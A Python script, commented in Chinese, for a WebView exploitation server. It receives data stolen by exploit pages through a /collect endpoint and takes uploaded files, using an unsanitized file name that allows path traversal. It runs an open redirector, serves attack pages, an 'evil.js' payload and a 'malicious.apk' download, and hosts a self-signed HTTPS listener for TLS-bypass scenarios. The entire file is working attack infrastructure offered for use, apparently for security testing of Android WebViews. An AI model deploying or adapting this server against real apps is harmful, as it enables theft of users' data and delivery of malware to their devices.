#!/usr/bin/env python3
"""
WebView 漏洞利用通用模板 — 服务端
端口:
  8000  HTTP  主服务（攻击页面 + 数据回收 + 文件上传下载 + 重定向）
  8443  HTTPS 自签名证书（4.1 TLS证书验证绕过场景）

接口:
  GET  /collect?d=<data>    统一数据回收（所有漏洞窃取的数据统一走这里）
  POST /upload              文件上传（3.1.1 文件选择回调专用）
  GET  /redirect?url=<url>  302重定向（2.2.3 重定向绕过专用）
  GET  /exp/<vid>           攻击页面（读取 exp/<vid>.html）
  GET  /evil.js             恶意JS资源（读取 exp/evil.js，4.2 混合内容专用）
  GET  /malicious.apk       恶意APK下载（读取 exp/malicious.apk，3.1.2 下载回调专用）
"""

import os
import time
import ssl
import socket
import threading
import urllib.parse as up
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================================
# 配置
# ============================================================
OUT_DIR = "received"
EXP_DIR = "exp"
os.makedirs(OUT_DIR, exist_ok=True)
os.makedirs(EXP_DIR, exist_ok=True)

CERT_FILE = "cert.pem"
KEY_FILE  = "key.pem"

# 本机IP（攻击页面中回调用）
def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

LOCAL_IP = _get_local_ip()
print(f"[*] 本机IP地址: {LOCAL_IP}")

# ============================================================
# 自签名证书生成
# ============================================================
def _ensure_cert():
    """如果没有证书文件，自动生成自签名证书"""
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    import datetime
    import ipaddress

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME,  "CN"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Beijing"),
        x509.NameAttribute(NameOID.LOCALITY_NAME,  "Beijing"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "WebViewExp"),
        x509.NameAttribute(NameOID.COMMON_NAME,    LOCAL_IP),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .add_extension(x509.SubjectAlternativeName([
            x509.IPAddress(ipaddress.IPv4Address(LOCAL_IP))
        ]), critical=False)
        .sign(key, hashes.SHA256())
    )
    with open(KEY_FILE, "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))
    with open(CERT_FILE, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    print(f"[*] 已生成自签名证书: {CERT_FILE}, {KEY_FILE}")

# ============================================================
# HTTP 请求处理器
# ============================================================
class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        scheme = "https" if self.__class__.__name__ == "SSLHandler" else "http"
        port = 8443 if scheme == "https" else 8000
        print(f"[{port}/{scheme}] {self.client_address[0]} - {fmt % args}")

    def do_GET(self):
        parsed = up.urlparse(self.path)
        path = parsed.path
        qs    = up.parse_qs(parsed.query)

        # ---- /collect?d=<data>  统一数据回收 ----
        if path == "/collect":
            data = qs.get("d", [""])[0]
            ts = int(time.time() * 1000)
            filename = os.path.join(OUT_DIR, f"collected_{ts}.txt")
            with open(filename, "w", encoding="utf-8") as f:
                f.write(data)
            print(f"  -> 收到数据: {filename}")
            self._respond(200, b"ok")
            return

        # ---- /redirect?url=<url>  302重定向 ----
        if path == "/redirect":
            target = qs.get("url", [None])[0]
            if target:
                self.send_response(302)
                self.send_header("Location", target)
                self.end_headers()
                print(f"  -> 302 重定向到: {target}")
            else:
                self._respond(400, b"missing url param")
            return

        # ---- /exp/<vid>  攻击页面 ----
        if path.startswith("/exp/"):
            vid = path[5:]  # 如 "1.1", "2.3.1"
            filepath = os.path.join(EXP_DIR, f"{vid}.html")
            if os.path.exists(filepath):
                self._serve_file(filepath, "text/html")
                print(f"  -> 提供攻击页面: {filepath}")
            else:
                self._respond(404, f"exp/{vid}.html not found\n".encode())
            return

        # ---- /evil.js  恶意JS（4.2 混合内容） ----
        if path == "/evil.js":
            filepath = os.path.join(EXP_DIR, "evil.js")
            if os.path.exists(filepath):
                self._serve_file(filepath, "application/javascript")
                print(f"  -> 提供恶意JS: {filepath}")
            else:
                self._respond(404, b"exp/evil.js not found\n")
            return

        # ---- /malicious.apk  恶意APK下载（3.1.2） ----
        if path == "/malicious.apk":
            filepath = os.path.join(EXP_DIR, "malicious.apk")
            if os.path.exists(filepath):
                self._serve_file(filepath, "application/vnd.android.package-archive")
                print(f"  -> 提供恶意APK下载: {filepath}")
            else:
                self._respond(404, b"exp/malicious.apk not found\n")
            return

        # ---- 默认：返回运行状态 ----
        self._respond(200, b"WebView Exploit Server Running\n")

    def do_POST(self):
        parsed = up.urlparse(self.path)

        # ---- /upload  文件上传（3.1.1） ----
        if parsed.path != "/upload":
            self._respond(404, b"Not Found")
            return

        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length > 0 else b""
        qs = up.parse_qs(parsed.query)
        name = qs.get("name", [None])[0]
        ts = int(time.time() * 1000)
        fname = name or f"uploaded_{ts}.bin"
        filepath = os.path.join(OUT_DIR, fname)
        with open(filepath, "wb") as f:
            f.write(body)
        self._respond(200, b"received")
        print(f"  -> 收到上传文件: {filepath} ({len(body)} bytes)")

    # ---- 工具方法 ----
    def _respond(self, code, body, content_type="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _serve_file(self, filepath, content_type):
        with open(filepath, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        # Serve exploit pages inline so the WebView renders them instead of downloading them.
        self.end_headers()
        self.wfile.write(data)


# ============================================================
# HTTPS 处理器（继承HTTP处理器，共用全部逻辑）
# ============================================================
class SSLHandler(Handler):
    pass

# ============================================================
# 服务启动
# ============================================================
def run_http():
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()

def run_https():
    _ensure_cert()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)
    httpd = HTTPServer(("0.0.0.0", 8443), SSLHandler)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()

if __name__ == "__main__":
    print(f"[*] 本机IP: {LOCAL_IP}")
    print("=" * 55)
    print("  :8000  HTTP  主服务")
    print("    GET  /collect?d=<data>  — 统一数据回收")
    print("    POST /upload            — 文件上传 (3.1.1)")
    print("    GET  /redirect?url=<url> — 302重定向 (2.2.3)")
    print("    GET  /exp/<vid>         — 攻击页面 (exp/<vid>.html)")
    print("    GET  /evil.js           — 恶意JS (exp/evil.js, 4.2)")
    print("    GET  /malicious.apk     — 恶意APK下载 (exp/malicious.apk, 3.1.2)")
    print("  :8443  HTTPS 自签名证书 (4.1)")
    print("=" * 55)

    threading.Thread(target=run_http,  daemon=True).start()
    threading.Thread(target=run_https, daemon=True).start()

    while True:
        time.sleep(10)

